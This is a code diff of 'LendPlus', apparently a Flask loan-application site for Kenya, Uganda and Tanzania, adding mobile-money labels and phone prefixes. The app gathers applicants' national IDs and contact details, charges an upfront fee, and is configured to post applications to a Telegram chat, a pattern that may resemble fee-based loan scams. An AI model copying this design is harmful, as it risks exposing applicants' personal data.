@@ -19,7 +19,7 @@ TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 TELEGRAM_ENABLED = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 
-# Country Configuration
+# Country Configuration - CORRECT PHONE PREFIXES
 COUNTRIES = {
     'kenya': {
         'name': 'Kenya',
@@ -28,7 +28,8 @@ COUNTRIES = {
         'phone_prefix': '+254',
         'flag': '🇰🇪',
         'min_loan': 1000,
-        'max_loan': 50000
+        'max_loan': 50000,
+        'mobile_money': 'M-Pesa'
     },
     'uganda': {
         'name': 'Uganda',
@@ -37,7 +38,8 @@ COUNTRIES = {
         'phone_prefix': '+256',
         'flag': '🇺🇬',
         'min_loan': 50000,
-        'max_loan': 2000000
+        'max_loan': 2000000,
+        'mobile_money': 'M-Pesa'
     },
     'tanzania': {
         'name': 'Tanzania',
@@ -46,7 +48,8 @@ COUNTRIES = {
         'phone_prefix': '+255',
         'flag': '🇹🇿',
         'min_loan': 10000,
-        'max_loan': 500000
+        'max_loan': 500000,
+        'mobile_money': 'M-Pesa'
     }
 }
 
@@ -54,7 +57,7 @@ APP_NAME = "LendPlus"
 COMPANY_NAME = "Aventus Technology Limited"
 SUPPORT_PHONE = "+254 709 029 000"
 SUPPORT_EMAIL = "customer@lendplus.ke"
-APPLICATION_FEE_PERCENT = 5  # 5% application fee
+APPLICATION_FEE_PERCENT = 5
 
 LOAN_PRODUCTS = {
     'small': {'min': 1000, 'max': 10000, 'fee': 5, 'months': 1},
@@ -92,6 +95,7 @@ def format_application_message(data):
     months = data.get('months', 1)
     country = data.get('country', 'Kenya')
     currency = data.get('currency', 'KES')
+    phone_prefix = data.get('phone_prefix', '+254')
     
     return f"""
 📋 <b>NEW LOAN APPLICATION</b>
@@ -100,10 +104,11 @@ def format_application_message(data):
 🌍 <b>Application Details</b>
 • Country: {data.get('flag', '')} {country}
 • Currency: {currency}
+• Mobile Money: {data.get('mobile_money', 'M-Pesa')}
 
 👤 <b>Personal Information</b>
 • Full Name: {data.get('first_name', 'N/A')} {data.get('last_name', 'N/A')}
-• Phone: {data.get('phone', 'N/A')}
+• Phone: {phone_prefix} {data.get('phone', 'N/A')}
 • Email: {data.get('email', 'N/A')}
 • ID Number: {data.get('national_id', 'N/A')}
 • Gender: {data.get('gender', 'N/A')}
@@ -126,7 +131,6 @@ def format_application_message(data):
 
 def calculate_loan_details(amount, country):
     """Calculate loan fee and repayment"""
-    # Get country-specific loan products
     if country == 'kenya':
         if amount <= 10000:
             fee_rate, months = 5, 1
@@ -259,6 +263,7 @@ def loan_amount():
                 'first_name': session.get('first_name', ''),
                 'last_name': session.get('last_name', ''),
                 'phone': session.get('phone', ''),
+                'phone_prefix': country_data['phone_prefix'],
                 'email': session.get('email', ''),
                 'national_id': session.get('national_id', ''),
                 'gender': session.get('gender', ''),
@@ -267,6 +272,7 @@ def loan_amount():
                 'flag': country_data['flag'],
                 'currency': currency,
                 'currency_symbol': currency_symbol,
+                'mobile_money': country_data['mobile_money'],
                 'loan_amount': amount,
                 'fee_rate': details['fee_rate'],
                 'fee_amount': details['fee_amount'],
@@ -278,7 +284,7 @@ def loan_amount():
             logger.info("=" * 50)
             logger.info(f"📋 APPLICATION RECEIVED - {country_data['flag']} {country_data['name']}")
             logger.info(f"Name: {application_data['first_name']} {application_data['last_name']}")
-            logger.info(f"Phone: {application_data['phone']}")
+            logger.info(f"Phone: {country_data['phone_prefix']} {application_data['phone']}")
             logger.info(f"Amount: {currency} {application_data['loan_amount']}")
             logger.info(f"Application ID: {application_id}")
             logger.info("=" * 50)
@@ -329,6 +335,8 @@ def confirmation():
     return render_template('confirmation.html',
                          first_name=data.get('first_name', ''),
                          last_name=data.get('last_name', ''),
+                         phone=data.get('phone', ''),
+                         phone_prefix=data.get('phone_prefix', '+254'),
                          amount=data.get('loan_amount', 0),
                          fee_rate=data.get('fee_rate', 5),
                          fee_amount=data.get('fee_amount', 0),
@@ -339,7 +347,8 @@ def confirmation():
                          country=data.get('country', 'Kenya'),
                          flag=data.get('flag', '🇰🇪'),
                          currency=data.get('currency', 'KES'),
-                         currency_symbol=data.get('currency_symbol', 'KSh'))
+                         currency_symbol=data.get('currency_symbol', 'KSh'),
+                         mobile_money=data.get('mobile_money', 'M-Pesa'))
 
 @app.route('/dashboard')
 def dashboard():
